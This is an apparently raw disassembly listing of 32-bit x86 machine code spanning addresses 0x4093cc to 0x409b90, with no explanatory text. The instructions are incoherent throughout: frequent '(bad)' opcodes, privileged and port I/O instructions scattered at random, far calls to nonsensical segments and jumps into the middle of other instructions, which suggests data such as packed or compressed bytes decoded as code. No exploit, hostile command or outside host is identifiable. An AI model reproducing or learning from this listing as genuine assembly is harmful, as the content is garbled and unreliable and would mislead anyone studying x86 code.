  4093cc:	add    BYTE PTR [eax-0x393e2d8c],cl
  4093d2:	jae    0x40936d
  4093d4:	xchg   esp,eax
  4093d5:	stos   DWORD PTR es:[edi],eax
  4093d6:	and    al,BYTE PTR [edi+0x70b966af]
  4093dc:	scas   eax,DWORD PTR es:[edi]
  4093dd:	xchg   ebx,eax
  4093de:	test   DWORD PTR [eax-0x7c],ecx
  4093e1:	jns    0x40945c
  4093e3:	aad    0x4f
  4093e5:	pop    ss
  4093e6:	ja     0x4093b7
  4093e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093e9:	jp     0x4093b3
  4093eb:	rcl    ebp,1
  4093ed:	sbb    al,0x40
  4093ef:	xor    BYTE PTR [eax+0x1a],0x4f
  4093f3:	dec    esi
  4093f4:	cmp    ah,BYTE PTR [edi]
  4093f6:	adc    edi,DWORD PTR [ebx+0x3d1ea50a]
  4093fc:	hlt    
  4093fd:	add    dl,ch
  4093ff:	mov    ebx,0x31c39eb7
  409404:	jbe    0x4093c8
  409406:	mov    esi,0xd84e733
  40940b:	les    eax,FWORD PTR [edi-0x273e3834]
  409411:	and    DWORD PTR [eax],0x39
  409414:	xlat   BYTE PTR ds:[ebx]
  409415:	jns    0x40941b
  409417:	mov    ah,BYTE PTR [ebx-0x1551ddc6]
  40941d:	repz imul ebx,DWORD PTR [ebx-0x3244972f],0x278f4490
  409428:	dec    edx
  409429:	ds sbb eax,0x505f149
  40942f:	test   eax,0x60bdecd8
  409434:	stos   BYTE PTR es:[edi],al
  409435:	add    ebp,ecx
  409437:	jnp    0x40942c
  409439:	xchg   edx,eax
  40943a:	pushf  
  40943b:	jb     0x409471
  40943d:	imul   ebx,DWORD PTR [eax],0xffffff92
  409440:	setne  BYTE PTR [ebx]
  409443:	aas    
  409444:	pop    ds
  409445:	test   BYTE PTR [ecx+0x5932b577],ah
  40944b:	sbb    BYTE PTR ds:[esp+ecx*8],0xed
  409450:	bound  esi,QWORD PTR [edx-0x79d518b8]
  409456:	push   0x10
  409458:	aaa    
  409459:	test   BYTE PTR [ecx],0x46
  40945c:	pop    ecx
  40945d:	mov    esp,0x3a6f347f
  409462:	mov    dl,dl
  409464:	inc    ebp
  409465:	imul   ecx,DWORD PTR [eax+edx*4+0x138d127b],0x233443f
  409470:	push   esp
  409471:	adc    edi,DWORD PTR [eax-0x48e93b11]
  409477:	fdiv   QWORD PTR [ecx]
  409479:	retf   0xd660
  40947c:	aam    0xd
  40947e:	lahf   
  40947f:	fs pop edi
  409481:	inc    esi
  409482:	inc    eax
  409483:	cmp    ecx,esp
  409485:	lock cmp BYTE PTR [ecx-0x7a],bl
  409489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40948a:	cld    
  40948b:	sub    DWORD PTR [edi-0x1],esi
  40948e:	dec    esp
  40948f:	dec    esp
  409490:	sub    DWORD PTR [edi],edi
  409492:	neg    BYTE PTR [esi+0x66b026d3]
  409498:	test   al,0x6d
  40949a:	pusha  
  40949b:	mov    BYTE PTR [esi+0x18de1e0b],al
  4094a1:	adc    eax,0x3b4b9570
  4094a6:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4094a8:	enter  0xee74,0x8b
  4094ac:	fistp  WORD PTR [ecx-0xc]
  4094af:	mov    al,ds:0x1d40ae8
  4094b4:	mov    eax,0x84c82c8e
  4094b9:	cmp    ch,BYTE PTR [eax+0x45]
  4094bc:	hlt    
  4094bd:	pop    ds
  4094be:	push   edx
  4094bf:	stos   BYTE PTR es:[edi],al
  4094c0:	ret    0x250f
  4094c3:	push   cs
  4094c4:	(bad)  [ebp+0x42a81cbf]
  4094ca:	push   eax
  4094cb:	pop    edi
  4094cc:	adc    ch,al
  4094ce:	cmp    ecx,DWORD PTR [ebx]
  4094d0:	xchg   ebx,eax
  4094d1:	in     eax,dx
  4094d2:	or     edi,esp
  4094d4:	jae    0x409511
  4094d6:	or     DWORD PTR [ebp+0x8d6eeb4],esi
  4094dc:	sub    BYTE PTR [ecx+0x54ae7434],cl
  4094e2:	mov    ebx,0xe6e374b8
  4094e7:	test   al,0xe5
  4094e9:	or     DWORD PTR [edi],eax
  4094eb:	and    al,0x8a
  4094ed:	sub    esp,DWORD PTR [ebp-0x5601c1d7]
  4094f3:	sbb    cl,BYTE PTR [eax+0x2c7a5b4b]
  4094f9:	sbb    DWORD PTR [esi+0x7989bf03],ebp
  4094ff:	xor    esp,esp
  409501:	or     esp,0x4d4be1dc
  409507:	adc    dl,bl
  409509:	sub    al,0x60
  40950b:	dec    bh
  40950d:	(bad)  [esi]
  40950f:	push   esp
  409510:	jns    0x4094f3
  409512:	repnz xlat BYTE PTR ds:[ebx]
  409514:	call   0x60c7b94f
  409519:	in     al,0x61
  40951b:	push   ebx
  40951c:	popf   
  40951d:	jns    0x409542
  40951f:	(bad)  
  409520:	call   0x8a1a8658
  409525:	push   cs
  409526:	cmp    dl,bl
  409528:	fdivr  st(7),st
  40952a:	shr    BYTE PTR [ebx-0x58],0x13
  40952e:	or     DWORD PTR [eax+0x57],0x17
  409532:	inc    edx
  409533:	jo     0x409538
  409535:	xor    edx,DWORD PTR [edx+0x34]
  409538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409539:	mul    al
  40953b:	retf   
  40953c:	xchg   edi,eax
  40953d:	add    DWORD PTR ds:0x48c82f67,eax
  409543:	sub    bl,ah
  409545:	popa   
  409546:	ds push cs
  409548:	and    eax,0x9e033962
  40954d:	sub    DWORD PTR [eax+0x5d85a9e],edi
  409553:	pop    es
  409554:	int    0xce
  409556:	sar    DWORD PTR [eax+0x78],0xec
  40955a:	int    0xa5
  40955c:	adc    DWORD PTR [edi],ebp
  40955e:	add    eax,DWORD PTR [ecx+ecx*2]
  409561:	int    0x6e
  409563:	push   ebx
  409564:	popa   
  409565:	or     DWORD PTR [ebx+0x6c],eax
  409568:	lods   al,BYTE PTR ds:[esi]
  409569:	loope  0x4094ff
  40956b:	sub    ah,dh
  40956d:	(bad)  
  40956e:	xchg   esi,eax
  40956f:	test   eax,0x363b6d1b
  409574:	or     ebp,DWORD PTR [edi]
  409576:	icebp  
  409577:	out    0x19,al
  409579:	xchg   edx,eax
  40957a:	iret   
  40957b:	xchg   ecx,eax
  40957c:	jecxz  0x4095d8
  40957e:	jne    0x4095ff
  409580:	pop    ds
  409581:	call   0xf21f4ab6
  409586:	jmp    0x4e083964
  40958b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40958c:	loopne 0x409515
  40958e:	or     eax,0xaeb6f5f7
  409593:	iret   
  409594:	or     esi,DWORD PTR [ecx-0x52]
  409597:	cli    
  409598:	mov    ds:0x2bd41efa,eax
  40959d:	clc    
  40959e:	inc    ebx
  40959f:	inc    edi
  4095a0:	fst    DWORD PTR [ebx]
  4095a2:	cmp    eax,0x1af3066d
  4095a7:	push   ds
  4095a8:	mov    bh,0x33
  4095aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095ab:	xchg   esp,eax
  4095ac:	sahf   
  4095ad:	cmp    DWORD PTR [ebp+eax*2-0x56],0xa68bf7e7
  4095b5:	adc    esi,ecx
  4095b7:	je     0x40960e
  4095b9:	in     eax,0xe6
  4095bb:	mov    dh,0x96
  4095bd:	hlt    
  4095be:	addr16 loopne 0x409611
  4095c1:	jno    0x4095c9
  4095c3:	mov    ebp,0x803de32b
  4095c8:	test   BYTE PTR [eax],bh
  4095ca:	mov    cl,0x23
  4095cc:	mov    ecx,0x3e349a7f
  4095d1:	mov    eax,0xaa47df61
  4095d6:	out    dx,eax
  4095d7:	and    al,0xdb
  4095d9:	nop
  4095da:	pop    es
  4095db:	add    DWORD PTR [ebp+0x10],0x7f
  4095df:	rcl    DWORD PTR [ebp-0x2e],0x71
  4095e3:	popf   
  4095e4:	les    edx,FWORD PTR [ebx-0x23]
  4095e7:	sar    DWORD PTR gs:[edx],0xff
  4095eb:	arpl   WORD PTR [edx+0x75d75827],bp
  4095f1:	sub    BYTE PTR ds:0x1c4a21cc,dh
  4095f7:	rep outs dx,BYTE PTR ds:[esi]
  4095f9:	fsubrp st(5),st
  4095fb:	mov    esi,0x13dae1c6
  409600:	push   ebx
  409601:	add    ebp,esi
  409603:	sub    cl,dh
  409605:	mov    esp,0xd6c35a26
  40960a:	mov    DWORD PTR [ecx+ecx*1],0x5d8f95d7
  409611:	or     DWORD PTR [ebp-0x4c],ebx
  409614:	and    BYTE PTR ds:0xab46a8d4,dh
  40961b:	xchg   DWORD PTR [esp+edi*4-0x2ae62440],ebx
  409622:	aam    0xbf
  409624:	xor    esi,DWORD PTR [edi]
  409626:	jmp    0x4095b4
  409628:	xor    eax,0x29628262
  40962d:	(bad)
  409630:	dec    eax
  409631:	or     BYTE PTR [ebx-0x78882fd0],al
  409637:	inc    esi
  409638:	jb     0x4095d9
  40963a:	pop    esp
  40963b:	mov    ah,BYTE PTR [eax-0x4fd8d406]
  409641:	jno    0x40964e
  409643:	jl     0x4095c9
  409645:	xchg   ebx,eax
  409646:	dec    ebp
  409647:	arpl   sp,cx
  409649:	xchg   DWORD PTR [ebp-0x17],esp
  40964c:	push   es
  40964d:	scas   eax,DWORD PTR es:[edi]
  40964e:	inc    ecx
  40964f:	leave  
  409650:	mov    ecx,DWORD PTR [esp+eiz*8+0x48b4337a]
  409657:	les    ebx,FWORD PTR [edx-0x35d6dd17]
  40965d:	jmp    0x409680
  40965f:	jnp    0x409684
  409661:	mov    WORD PTR [eax+ebx*4-0x69],?
  409665:	call   0x3578:0xfbc5e340
  40966c:	push   0x28
  40966e:	dec    edx
  40966f:	or     ecx,DWORD PTR gs:[ebx-0x269a0b95]
  409676:	add    eax,0xe8e9bd94
  40967b:	aam    0x38
  40967d:	or     al,0x2a
  40967f:	pop    es
  409680:	cmp    BYTE PTR [edx],ch
  409682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409683:	xor    BYTE PTR [ecx],0x40
  409686:	(bad)
  409689:	xor    eax,DWORD PTR [esi]
  40968b:	mov    bh,0x7d
  40968d:	dec    ebx
  40968e:	or     bl,BYTE PTR [edx-0x8bd5b06]
  409694:	fbld   TBYTE PTR [edx]
  409696:	stos   BYTE PTR es:[edi],al
  409697:	add    ebx,DWORD PTR [edi]
  409699:	jl     0x409631
  40969b:	daa    
  40969c:	or     bl,BYTE PTR [edx+0x22f5f823]
  4096a2:	rcr    BYTE PTR [esi+0xc85e1f8],cl
  4096a8:	push   esi
  4096a9:	shr    edi,1
  4096ab:	xlat   BYTE PTR ds:[ebx]
  4096ac:	or     al,cl
  4096ae:	loope  0x4096ce
  4096b0:	mov    ecx,DWORD PTR [ebp-0x14]
  4096b3:	jmp    0x409c3d
  4096b8:	out    0x84,eax
  4096ba:	inc    ebx
  4096bb:	mov    bl,BYTE PTR [eax]
  4096bd:	push   eax
  4096be:	sahf   
  4096bf:	pop    eax
  4096c0:	sub    DWORD PTR [ecx+0x7a14b254],edx
  4096c6:	mov    al,0xae
  4096c8:	aam    0x2d
  4096ca:	push   ss
  4096cb:	push   ss
  4096cc:	cmp    eax,0x41161604
  4096d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096d2:	mov    ebp,0x6078792d
  4096d7:	dec    esp
  4096d8:	test   DWORD PTR [edx+0x14577ce5],0x52ccfca7
  4096e2:	test   eax,0x2fee5975
  4096e7:	and    eax,0x5675eb65
  4096ec:	pushf  
  4096ed:	add    BYTE PTR [eax],cl
  4096ef:	sbb    al,0x0
  4096f1:	push   ds
  4096f2:	out    dx,eax
  4096f3:	mov    ss,ebp
  4096f5:	ret    
  4096f6:	jmp    0xb2ae:0xc98af87a
  4096fd:	cmp    al,0x0
  4096ff:	je     0x409700
  409701:	xchg   esp,eax
  409702:	jg     0x409756
  409704:	mov    dl,0x21
  409706:	fld    st(7)
  409708:	xchg   esp,eax
  409709:	jae    0x409708
  40970b:	adc    eax,DWORD PTR [edx]
  40970d:	mov    dh,0x2
  40970f:	shl    DWORD PTR [esi],cl
  409711:	sti    
  409712:	aam    0x5d
  409714:	jmp    0x409775
  409716:	cmp    ch,0x60
  409719:	hlt    
  40971a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40971b:	imul   ebx,ebx,0x3fb7147b
  409721:	cmp    DWORD PTR [edi],esp
  409723:	(bad)  
  409725:	jl     0x4096de
  409727:	jp     0x4097a5
  409729:	in     eax,dx
  40972a:	loope  0x4096e0
  40972c:	adc    dl,0xe9
  40972f:	cdq    
  409730:	mov    dh,BYTE PTR [ecx+eax*1+0x3de83a08]
  409737:	mov    ebp,0x73fa99fc
  40973c:	inc    edi
  40973d:	inc    ecx
  40973e:	nop
  40973f:	ins    DWORD PTR es:[edi],dx
  409740:	jg     0x409708
  409742:	test   eax,0xb4ffaa6e
  409747:	mov    esp,0x2aae5890
  40974c:	pop    ecx
  40974d:	ds cwde 
  40974f:	test   eax,0x7c7b4d85
  409754:	stc    
  409755:	lock mov esi,0x36d1e9a4
  40975b:	push   0x61
  40975d:	cmp    ebx,esp
  40975f:	jmp    0x367fd7a8
  409764:	in     al,0x3b
  409766:	clc    
  409767:	cmp    BYTE PTR [ebx-0x38b7ce9f],dh
  40976d:	sti    
  40976e:	cs or  eax,0xc95d7c3c
  409774:	and    eax,0x55
  409777:	pop    edi
  409778:	push   0x3d2c8d81
  40977d:	(bad)  
  40977e:	dec    ecx
  40977f:	inc    ebp
  409780:	lods   eax,DWORD PTR cs:[esi]
  409782:	xchg   DWORD PTR [edi-0x37595aba],ecx
  409788:	dec    eax
  409789:	repz sbb edi,DWORD PTR [ebp-0x7c]
  40978d:	xor    edi,edi
  40978f:	pop    es
  409790:	jnp    0x409742
  409792:	mov    ds:0xccbfda57,al
  409797:	ficomp DWORD PTR [esi-0x48]
  40979a:	jmp    0x40973a
  40979c:	in     eax,dx
  40979d:	loop   0x40980a
  40979f:	inc    eax
  4097a0:	in     eax,dx
  4097a1:	cmp    BYTE PTR [eax-0x63],dl
  4097a4:	and    DWORD PTR [ebp+0x3c],esp
  4097a7:	inc    esi
  4097a8:	sub    ebx,DWORD PTR [eax-0x6]
  4097ab:	sahf   
  4097ac:	mov    eax,ds:0xb27746b1
  4097b1:	call   0x7c8d:0x46bffc2
  4097b8:	retf   
  4097b9:	mov    eax,ds:0x84c203d1
  4097be:	ja     0x4097d0
  4097c0:	push   0x57b0fec
  4097c5:	neg    DWORD PTR [esi+ebx*1]
  4097c8:	mov    dh,0xef
  4097ca:	aad    0xe8
  4097cc:	pop    edx
  4097cd:	ret    0x5a3e
  4097d0:	dec    edi
  4097d1:	inc    ebp
  4097d2:	test   al,0xa0
  4097d4:	ret    0x28c6
  4097d7:	sahf   
  4097d8:	nop
  4097d9:	push   es
  4097da:	mov    ds:0x6f19ca74,eax
  4097df:	sub    BYTE PTR [ebp-0x6f],al
  4097e2:	push   eax
  4097e3:	loopne 0x409797
  4097e5:	int3   
  4097e6:	call   0x8db11041
  4097eb:	outs   dx,DWORD PTR ds:[esi]
  4097ec:	cmp    ebp,0x14
  4097ef:	add    al,0xce
  4097f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097f2:	and    dh,BYTE PTR ss:[edi+0x43]
  4097f6:	cld    
  4097f7:	mov    ah,0x31
  4097f9:	sub    al,0x9a
  4097fb:	outs   dx,BYTE PTR ds:[esi]
  4097fc:	cmp    eax,0x1456b859
  409801:	mov    ebp,0x4a207180
  409806:	sbb    edx,DWORD PTR [ebp-0x23]
  409809:	out    0xcc,eax
  40980b:	push   cs
  40980c:	(bad)  
  40980d:	push   ebx
  40980e:	out    dx,eax
  40980f:	leave  
  409810:	iret   
  409811:	scas   eax,DWORD PTR es:[edi]
  409812:	cmp    eax,0xfcb7851a
  409817:	dec    esi
  409818:	rcr    BYTE PTR [ebp-0x7f],0xaa
  40981c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40981d:	test   edi,ecx
  40981f:	mov    edx,0xb3c3965e
  409824:	fist   WORD PTR [ebx+edi*1+0x4c]
  409828:	mov    ch,bh
  40982a:	leave  
  40982b:	xchg   esp,eax
  40982c:	jge    0x409804
  40982e:	mov    ds,ecx
  409830:	fldcw  WORD PTR [eax-0x443a5093]
  409836:	fadd   QWORD PTR [ebx-0x2f4de4d]
  40983c:	inc    esp
  40983d:	inc    edi
  40983e:	cmp    bl,BYTE PTR [edx+0x2f5bb2a7]
  409844:	xchg   edi,eax
  409845:	dec    edx
  409846:	push   ebp
  409847:	inc    edx
  409848:	and    eax,DWORD PTR [ecx]
  40984a:	retf   
  40984b:	pop    ds
  40984c:	test   DWORD PTR [ebx-0x2661a5c6],ebx
  409852:	in     al,0xf4
  409854:	xor    DWORD PTR [edx+0x3196ef69],edx
  40985a:	stos   BYTE PTR es:[edi],al
  40985b:	jno    0x409813
  40985d:	inc    edx
  40985e:	sti    
  40985f:	mov    ah,0x9c
  409861:	sub    dh,ch
  409863:	sahf   
  409864:	sbb    DWORD PTR [edx],0x181a7169
  40986a:	mov    cl,0xde
  40986c:	dec    edi
  40986d:	pop    ebx
  40986e:	cld    
  40986f:	sub    al,BYTE PTR [edx+0x5617ca7b]
  409875:	jbe    0x40986d
  409877:	(bad)  
  409879:	mov    bl,0xf9
  40987b:	xor    BYTE PTR [ebp+eiz*2+0x63],ah
  40987f:	push   ds
  409880:	mov    bh,0xfb
  409882:	pop    es
  409883:	les    ecx,FWORD PTR [esi+eiz*1+0x68ac4fbe]
  40988a:	add    edi,ebx
  40988c:	or     ch,dl
  40988e:	or     al,0x9e
  409890:	dec    edi
  409891:	dec    esp
  409892:	(bad)  
  409893:	aas    
  409894:	daa    
  409895:	test   al,ch
  409897:	jge    0x4098bd
  409899:	inc    edx
  40989a:	push   edx
  40989b:	xchg   bp,ax
  40989d:	cmp    edi,DWORD PTR [ebx]
  40989f:	inc    ebp
  4098a0:	ror    DWORD PTR [esi+0x68],1
  4098a3:	mov    dh,0x36
  4098a5:	(bad)  
  4098a6:	mov    al,ds:0x43ae1d3d
  4098ab:	adc    al,0xf1
  4098ad:	jmp    0x4098e1
  4098af:	add    eax,0x6be31103
  4098b4:	cmp    ebx,DWORD PTR [ebx+0x76247b16]
  4098ba:	sahf   
  4098bb:	ins    DWORD PTR es:[edi],dx
  4098bc:	push   edi
  4098bd:	ja     0x409846
  4098bf:	mov    dl,0xb4
  4098c1:	test   ah,bl
  4098c3:	cli    
  4098c4:	out    0x87,eax
  4098c6:	loopne 0x4098dc
  4098c8:	jbe    0x4098c4
  4098ca:	icebp  
  4098cb:	add    eax,0xb2c33b68
  4098d0:	int3   
  4098d1:	sub    DWORD PTR [edx],edx
  4098d3:	pushf  
  4098d4:	push   esi
  4098d5:	xchg   DWORD PTR [ecx-0x1e70b188],ebx
  4098db:	sbb    al,0x13
  4098dd:	rcr    BYTE PTR [edx-0x5e],0xa8
  4098e1:	adc    DWORD PTR [ecx+0x2e9b285],ebx
  4098e7:	(bad)  
  4098e8:	test   al,0xc3
  4098ea:	ficomp WORD PTR [edi+0x24]
  4098ed:	(bad)  
  4098ee:	sbb    esi,ecx
  4098f0:	in     al,dx
  4098f1:	push   DWORD PTR ds:0x49db01f9
  4098f7:	xchg   esp,eax
  4098f8:	xor    BYTE PTR [edx],0x57
  4098fb:	jb     0x4098e9
  4098fd:	ficom  DWORD PTR [esi+0x7c]
  409900:	sub    DWORD PTR [ebx],esi
  409902:	int3   
  409903:	push   ebx
  409904:	mov    al,0xf0
  409906:	jb     0x4098ee
  409908:	push   cs
  409909:	ret    
  40990a:	(bad)  
  40990b:	data16 jg 0x4098d6
  40990e:	cs push ecx
  409910:	cmp    eax,0x957674f8
  409915:	imul   esp,DWORD PTR [edx-0x51e93960],0x9ef6ec2f
  40991f:	push   eax
  409920:	push   ss
  409921:	xor    cl,BYTE PTR [edi+0x7a]
  409924:	ins    DWORD PTR es:[edi],dx
  409925:	popa   
  409926:	out    dx,al
  409927:	and    DWORD PTR [edx+edi*1],0x42
  40992b:	mov    es,WORD PTR [ecx+0x2c]
  40992e:	mov    ds:0xb0dee14,eax
  409933:	aam    0xed
  409935:	lahf   
  409936:	pop    eax
  409937:	xchg   DWORD PTR [ecx-0x4bcc37b4],edx
  40993d:	arpl   WORD PTR [ecx],dx
  40993f:	loop   0x4098f3
  409941:	push   0xc1635347
  409946:	jo     0x40995c
  409948:	sub    bl,al
  40994a:	pop    esi
  40994b:	(bad)  
  40994c:	dec    ebx
  40994d:	lea    ebp,[esi-0x76]
  409950:	mov    bl,0xaf
  409952:	mov    eax,ds:0xa78a8e1c
  409957:	inc    esi
  409958:	xor    BYTE PTR [edx-0x5a],bl
  40995b:	dec    ebp
  40995c:	inc    ecx
  40995d:	in     eax,dx
  40995e:	shr    ebx,cl
  409960:	sub    eax,0x1355879b
  409965:	mov    WORD PTR [ecx+eiz*8+0x7e],ss
  409969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40996a:	xor    edi,ebp
  40996c:	or     DWORD PTR ds:0xb3e7118c,esi
  409972:	les    ebx,FWORD PTR [ebx+ebx*8-0x77]
  409976:	and    eax,0x10a7135a
  40997b:	test   al,0x2d
  40997d:	rcr    DWORD PTR [ebp+0xe],cl
  409980:	xchg   DWORD PTR [edi+ebp*4+0x4e],edx
  409984:	xchg   DWORD PTR [edi-0x45],edi
  409987:	inc    esp
  409988:	lods   eax,DWORD PTR ds:[esi]
  409989:	adc    bh,dl
  40998b:	xchg   ecx,eax
  40998c:	hlt    
  40998d:	mov    dh,0x26
  40998f:	in     eax,dx
  409990:	mov    ecx,edi
  409992:	jno    0x409955
  409994:	out    dx,eax
  409995:	and    BYTE PTR [edi-0xe],cl
  409998:	das    
  409999:	pop    es
  40999a:	and    eax,0x4572caa9
  40999f:	adc    DWORD PTR [eax],ebx
  4099a1:	fs (bad) 
  4099a3:	(bad)  
  4099a4:	xlat   BYTE PTR ds:[ebx]
  4099a5:	adc    ah,BYTE PTR [ebp-0x11]
  4099a8:	sub    DWORD PTR [eax+0x793f88b1],ebx
  4099ae:	(bad)  
  4099af:	pop    esi
  4099b0:	addr16 sbb al,0x48
  4099b3:	xor    al,0x71
  4099b5:	xlat   BYTE PTR ds:[ebx]
  4099b6:	mov    ds:0xd05dff2b,eax
  4099bb:	push   es
  4099bc:	dec    edx
  4099bd:	cmp    al,0x8
  4099bf:	aad    0xe4
  4099c1:	pop    ebx
  4099c2:	and    al,BYTE PTR [esi]
  4099c4:	gs inc ebp
  4099c6:	xor    al,0x89
  4099c8:	xor    ebx,DWORD PTR [edx+ebp*4-0x4667c431]
  4099cf:	shl    BYTE PTR [esi],cl
  4099d1:	aas    
  4099d2:	fnstenv [ebx]
  4099d4:	fsubrp st(5),st
  4099d6:	dec    ebx
  4099d7:	int3   
  4099d8:	and    al,0xa1
  4099da:	sahf   
  4099db:	pushf  
  4099dc:	cdq    
  4099dd:	inc    ebx
  4099de:	sbb    DWORD PTR [ecx-0x3b],ebp
  4099e1:	ret    0xa5d6
  4099e4:	jno    0x409a54
  4099e6:	je     0x409a65
  4099e8:	cmp    ebx,DWORD PTR [esp+edx*2-0x3b066f37]
  4099ef:	and    BYTE PTR [eax+0x409287c6],dl
  4099f5:	scas   al,BYTE PTR es:[edi]
  4099f6:	ins    BYTE PTR es:[edi],dx
  4099f7:	xor    eax,0x5d4342bb
  4099fc:	ins    DWORD PTR es:[edi],dx
  4099fd:	daa    
  4099fe:	mov    DWORD PTR [edi-0x4f6ca745],edx
  409a04:	stc    
  409a05:	pop    edi
  409a06:	inc    ebp
  409a07:	int3   
  409a08:	ror    BYTE PTR [ecx+0x2],0x7
  409a0c:	cdq    
  409a0d:	pop    esp
  409a0e:	pop    edi
  409a0f:	xchg   ebx,eax
  409a10:	imul   esp,DWORD PTR [esp+ebx*4+0x50],0xffffff80
  409a15:	out    0xc9,al
  409a17:	jno    0x409a58
  409a19:	mov    bl,0x83
  409a1b:	sahf   
  409a1c:	xchg   ecx,eax
  409a1d:	ret    0x9006
  409a20:	push   esp
  409a21:	jae    0x409a7d
  409a23:	cmp    BYTE PTR [ecx-0x42],bh
  409a26:	inc    ecx
  409a27:	add    DWORD PTR [ebp+0x42],ecx
  409a2a:	jmp    0x409a0a
  409a2c:	xor    edx,esp
  409a2e:	adc    bh,BYTE PTR [edx+0x8]
  409a31:	repnz push es
  409a33:	xchg   edx,eax
  409a34:	popa   
  409a35:	or     DWORD PTR [ebp+edx*8+0x78],edx
  409a39:	mov    edi,0x62e729ed
  409a3e:	sub    eax,0xe58e24a3
  409a43:	mov    WORD PTR [edi],?
  409a45:	sub    al,0x97
  409a47:	or     eax,0x25cc2616
  409a4c:	test   al,0x58
  409a4e:	pop    ebp
  409a4f:	add    DWORD PTR [ebp-0x44b10c71],edx
  409a55:	push   eax
  409a56:	cwde   
  409a57:	and    dh,BYTE PTR [esi+0x5afd8e5f]
  409a5d:	pop    ebp
  409a5e:	push   edi
  409a5f:	jecxz  0x4099fb
  409a61:	(bad)  
  409a62:	in     eax,dx
  409a63:	sbb    eax,0x8b647cd9
  409a68:	daa    
  409a69:	xor    al,ah
  409a6b:	sbb    eax,0xe50bcd73
  409a70:	mov    ch,0xb0
  409a72:	fld    QWORD PTR [edi]
  409a74:	test   al,0xfa
  409a76:	das    
  409a77:	inc    edx
  409a78:	or     al,BYTE PTR [esi-0x2b]
  409a7b:	mov    bh,0xbb
  409a7d:	and    ecx,DWORD PTR [ebx]
  409a7f:	hlt    
  409a80:	pop    ds
  409a81:	xor    DWORD PTR [ebx],0x2a1f18ea
  409a87:	xor    ebp,DWORD PTR [edx+0x39]
  409a8a:	sar    DWORD PTR [edx-0x43],cl
  409a8d:	adc    al,0x5c
  409a8f:	adc    ecx,DWORD PTR ds:0x3997e78f
  409a95:	dec    edx
  409a96:	jge    0x409a54
  409a98:	adc    eax,0x6b1ca416
  409a9d:	xchg   esi,eax
  409a9e:	inc    esi
  409a9f:	add    ah,0x55
  409aa2:	or     BYTE PTR [esi+0x45],al
  409aa5:	add    DWORD PTR [ebx+0x1e],ebp
  409aa8:	dec    eax
  409aa9:	jp     0x409ad3
  409aab:	lahf   
  409aac:	cli    
  409aad:	dec    ecx
  409aae:	rcr    DWORD PTR [edx+edx*4],cl
  409ab1:	sub    ebp,DWORD PTR [ebx-0x46]
  409ab4:	loopne 0x409a50
  409ab6:	xor    eax,DWORD PTR [ebx]
  409ab8:	pop    esi
  409ab9:	xlat   BYTE PTR ds:[ebx]
  409aba:	(bad)  
  409abb:	mov    ebx,0xcc559849
  409ac0:	call   0x82e2afdd
  409ac5:	gs cs cwde 
  409ac8:	mov    cl,0xcd
  409aca:	dec    esi
  409acb:	test   eax,0xe79d69c4
  409ad0:	fild   WORD PTR [eax+0x569eb70b]
  409ad6:	sbb    BYTE PTR [edx],0xaa
  409ad9:	adc    bl,BYTE PTR [ecx]
  409adb:	repz sub al,0xcc
  409ade:	jo     0x409a9b
  409ae0:	retf   
  409ae1:	mov    bh,0xf7
  409ae3:	imul   eax,DWORD PTR [esi+0x3c],0xffffff90
  409ae7:	fisttp QWORD PTR [ebp+0x272cfc28]
  409aed:	jae    0x409a95
  409aef:	sub    DWORD PTR [ebp-0x21],esp
  409af2:	js     0x409afd
  409af4:	stc    
  409af5:	stc    
  409af6:	shl    edx,1
  409af8:	imul   edx,DWORD PTR [ebx+0x34],0xffffffce
  409afc:	aas    
  409afd:	dec    edi
  409afe:	pop    es
  409aff:	sti    
  409b00:	dec    esp
  409b01:	or     ecx,edx
  409b03:	into   
  409b04:	dec    ebx
  409b05:	adc    ebp,ecx
  409b07:	scas   al,BYTE PTR es:[edi]
  409b08:	call   0x81eb:0x27e76f35
  409b0f:	inc    esp
  409b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b11:	mov    cl,0x61
  409b13:	xor    BYTE PTR [ebx-0x31],bh
  409b16:	(bad)  
  409b17:	sbb    al,0xcb
  409b19:	push   0xffffff9d
  409b1b:	popa   
  409b1c:	or     DWORD PTR [edi+0x740976f0],0xffffff8d
  409b23:	dec    edi
  409b24:	fs mov cl,0x2f
  409b27:	mov    cl,bl
  409b29:	push   edx
  409b2a:	adc    BYTE PTR [edi],0x5f
  409b2d:	js     0x409ac6
  409b2f:	xor    eax,ecx
  409b31:	dec    esi
  409b32:	cs xchg edx,eax
  409b34:	dec    edi
  409b35:	adc    BYTE PTR [edi],dh
  409b37:	call   edi
  409b39:	mov    ebx,edi
  409b3b:	aaa    
  409b3c:	lods   al,BYTE PTR ds:[esi]
  409b3d:	pop    ds
  409b3e:	lods   al,BYTE PTR ds:[esi]
  409b3f:	aaa    
  409b40:	out    0xe3,al
  409b42:	je     0x409b49
  409b44:	dec    BYTE PTR [eax-0x1fd773ca]
  409b4a:	das    
  409b4b:	aas    
  409b4c:	call   0x999f5278
  409b51:	xchg   ebx,eax
  409b52:	imul   eax,ecx,0x10ddded1
  409b58:	and    BYTE PTR [eax+0x78],dh
  409b5b:	xchg   esi,eax
  409b5c:	sub    bl,BYTE PTR [ebx+0x4b376dc1]
  409b62:	arpl   WORD PTR [eax+0xe],sp
  409b65:	jae    0x409b02
  409b67:	fcom   QWORD PTR [eax+0x10731b73]
  409b6d:	add    bh,BYTE PTR [ecx-0x2b]
  409b70:	popa   
  409b71:	std    
  409b72:	not    ch
  409b74:	fwait
  409b75:	pop    esi
  409b76:	loope  0x409b4b
  409b78:	push   0xba9b9820
  409b7d:	iret   
  409b7e:	retf   
  409b7f:	sub    bl,BYTE PTR [eax-0x530387]
  409b85:	sbb    al,0x90
  409b87:	js     0x409b3f
  409b89:	mov    ebp,0x557b13fb
  409b8e:	gs pop esp
  409b90:	xchg   ch,dh
